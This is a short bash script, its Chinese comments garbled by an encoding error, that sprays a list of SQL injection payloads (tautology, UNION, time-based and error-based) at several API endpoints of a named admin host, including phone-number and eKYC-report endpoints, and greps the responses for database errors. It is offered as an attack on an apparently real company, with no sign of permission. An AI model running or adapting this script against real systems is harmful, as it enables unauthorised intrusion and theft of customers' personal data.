#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ æ·±åº¦æ”»å‡»3ï¼šé«˜çº§SQLæ³¨å…¥ç»•è¿‡"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="admin.giaohangtietkiem.vn"

# é«˜çº§SQLæ³¨å…¥payload
PAYLOADS=(
    "1' OR '1'='1"
    "1' OR 1=1--"
    "1' OR '1'='1' /*"
    "1'||'1'='1"
    "1'/**/OR/**/1=1--"
    "1' UnIoN SeLeCt 1,2,3--"
    "1' AND SLEEP(5)--"
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "1' AND extractvalue(1,concat(0x7e,version()))--"
    "1%27%20OR%201=1--"
    "1' OR '1'='1' #"
    "admin'--"
    "' OR 1=1 LIMIT 1--"
)

echo "[*] æµ‹è¯•æ‰€æœ‰APIç«¯ç‚¹çš„SQLæ³¨å…¥"

APIS=(
    "/api/user"
    "/api/search"
    "/AdMasterProfile/getPhoneNumber"
    "/AdHr/getEkycReports"
)

for api in "${APIS[@]}"; do
    echo ""
    echo "â”â”â” $api â”â”â”"
    for payload in "${PAYLOADS[@]}"; do
        encoded=$(echo -n "$payload" | jq -sRr @uri)
        resp=$(curl -sk "https://$TARGET${api}?id=${encoded}" -m 3 2>&1)
        
        # æ£€æŸ¥SQLé”™è¯¯
        if echo "$resp" | grep -qiE "sql|mysql|syntax|error|warning|exception"; then
            echo "  âš ï¸  SQLé”™è¯¯: $payload"
            echo "$resp" | grep -iE "sql|mysql|syntax" | head -3
        fi
    done
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
